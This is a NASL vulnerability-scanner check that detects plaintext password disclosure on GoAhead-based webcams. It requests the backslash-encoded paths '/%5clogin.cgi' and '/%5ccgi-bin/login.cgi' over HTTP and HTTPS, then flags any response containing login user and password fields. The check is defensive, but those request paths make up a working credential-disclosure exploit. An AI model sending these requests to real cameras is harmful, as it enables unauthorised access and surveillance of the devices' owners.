############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799114);
 name = "GoAhead series Webcam - plaintext password disclosure";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"GoAhead is the most popular embedded web server, which is deployed in hundreds of millions of devices, and is an ideal choice for various embedded devices and applications. Based on the plaintext password disclosure of GoAhead series webcam, the attacker can view all user names and passwords of the device, obtain background permissions, view monitoring content, and control the entire device through a simple HTTP request.");
 script_set_attribute(attribute:"solution", value:"Add permission settings, white list restrictions can be logged in IP.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url1 = string("/%5clogin.cgi");
	req1 = http_send_recv3(method: "GET", port: port, item: url1);
	url2 = string("/%5ccgi-bin/login.cgi");
	req2 = http_send_recv3(method: "GET", port: port, item: url2);
	if( req1[2] == NULL && req2[2] == NULL) exit(0);
	con = url1 + req1[2] + url2 + req2[2];
	if( ("200 ">< req1[0] && " loginuser=" >< req1[2] && " loginpass=" >< req1[2]) || ("200 ">< req2[0] && " loginuser=" >< req2[2] && " loginpass=" >< req2[2]) ){
	  	if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==443 ) host=host1;
    else host = string(host1,":",port);
	req1 = 'GET /%5clogin.cgi HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Connection: close\r\n' +
      'Upgrade-Insecure-Requests: 1\r\n\r\n';
	req2 = 'GET /%5ccgi-bin/login.cgi HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Connection: close\r\n' +
      'Upgrade-Insecure-Requests: 1\r\n\r\n';
    ssl_req1 = https_req_get(port:port , request:req1);
	ssl_req2 = https_req_get(port:port , request:req2);
	if( ssl_req1 == NULL && ssl_req2 == NULL) exit(0);
	con = req1 + ssl_req1 + req2 + ssl_req2;
	if(  ("200 ">< ssl_req1 && " loginuser=" >< ssl_req1 && " loginpass=" >< ssl_req1) || ("200 ">< ssl_req2 && " loginuser=" >< ssl_req2 && " loginpass=" >< ssl_req2) ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}